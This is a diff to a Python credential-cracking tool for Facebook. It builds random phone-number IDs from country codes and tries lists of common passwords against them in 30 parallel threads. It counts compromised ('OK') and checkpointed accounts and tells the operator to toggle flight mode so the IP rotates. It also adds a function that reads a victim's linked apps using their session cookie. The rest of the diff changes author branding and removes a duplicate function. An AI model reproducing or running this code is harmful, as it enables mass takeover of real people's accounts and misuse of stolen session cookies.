@@ -123,7 +123,7 @@ except:
     getx.close()
 MY_KEY = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()"""
 #__________________| COLOUR |__________________#
-A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
+A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';faltu = "\033[1;47m";pvt = "\033[1;0m";BLACK="\033[1;30m"
 
 #__________________| LINE |__________________#
 def clear():os.system('clear');print(logo)
@@ -131,19 +131,14 @@ def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━
 
 #__________________| LOGO |__________________#
 logo=(f"""
-            FIXED BY SHAJON-404
+{faltu} {black}"If you get tired, learn to rest, not to quit."... {pvt}
 \x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-\033[1;32m[\033[1;31m✓\033[1;32m] Author     : JEEVAN× BEB
-\033[1;32m[\033[1;31m✓\033[1;32m] GitHub     : https://github.com/Jeevanbeb
-\033[1;32m[\033[1;31m✓\033[1;32m] Facebook.  : JEEVAN BEB
+\033[1;32m[\033[1;31m✓\033[1;32m] Author     : SUMON
+\033[1;32m[\033[1;31m✓\033[1;32m] Facebook  : SUMON ROY
 \033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;33mFile ×\033[1;35mRandom 
-\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;35m2.1
-\033[1;32m[\033[1;31m✓\033[1;32m] TOOL       : \033[1;33mGreen
-\033[1;32m[\033[1;31m✓\033[1;32m] STATUS     :\033[1;35m PAID
-\033[1;32m[\033[1;31m✓\033[1;32m] WHAT'S UPP.:\033[1;35m 9817821280 
-\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\033[1;32m[\033[1;31m✓\033[1;35m Your_Key : FIXED BY SHAJON-404
+\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;35m0.0.1
+\033[1;32m[\033[1;31m✓\033[1;32m] STATUS     :\033[1;35m FREE
 \x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 #__________________| MAIN |__________________#
 def clear():
@@ -334,7 +329,7 @@ def bd():
 def india():
 		user=[]
 		clear()
-		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : +91639 | +91934 | +91902 | +91937 ');linex()
+		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 9815 | 9814 | 9861 | 9840  ');linex()
 		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
 		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
 		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
@@ -342,14 +337,14 @@ def india():
 		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
 		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
 		for nmbr in range(limit):
-			nmp = "". join(random.choice(string.digits) for _ in range(7))
+			nmp = "". join(random.choice(string.digits) for _ in range(6))
 			user.append(nmp)
 		with tred(max_workers=30) as habib:	
 			clear()
 			tl = str(len(user))
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
-			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
+			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE [ON/OF] YOUR FLIGHT MODE');linex()
 			for psx in user:
 				uid = code+psx
 				passlist = [psx,uid[:8],'57273200','59039200','57575751']
@@ -479,7 +474,7 @@ def afghanistan():
 		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
 		menu()	
-
+#__________________| malaysia |__________________#
 def malaysia():
 		user=[]
 		clear()
@@ -517,43 +512,6 @@ def malaysia():
 		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
 		menu()
 		
-def afghanistan():
-		user=[]
-		clear()
-		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 011');linex()
-		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
-		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
-		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
-		clear()
-		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
-		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
-		for nmbr in range(limit):
-			nmp = "". join(random.choice(string.digits) for _ in range(7))
-			user.append(nmp)
-		with tred(max_workers=30) as habib:	
-			clear()
-			tl = str(len(user))
-			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
-			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
-			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
-			for psx in user:
-				uid = code+psx
-				passlist = [psx,uid,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
-				if mthd in ['1','01']:
-					habib.submit(rndm1,uid,passlist)
-				if mthd in ['2','02']:
-					habib.submit(rndm2,uid,passlist)
-				if mthd in ['3','03']:
-					habib.submit(rndm3,uid,passlist)
-		print('\033[1;37m')
-		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
-		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
-		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
-		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
-		menu()
-	
 #__________________| FILE METHOD M1 |__________________#
 def api1(ids,names,passlist):
         try:
@@ -1204,7 +1162,30 @@ def rndm3(uid,passlist):
         except Exception as e:
                 pass
  
+#----------------[ ID-CHECKER ]--------------------------#
 
+def cek_apk(kuki):
+	session = requests.Session()
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
+	except AttributeError:
+		print ("\r    %s\033[0m cookie invalid"%(M))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
+	except AttributeError:
+		print ("\r    %s \033[0mcookie invalid"%(M))
+
+#-------------------------close-----------------------------
 if __name__ == '__main__':
     menu()
 
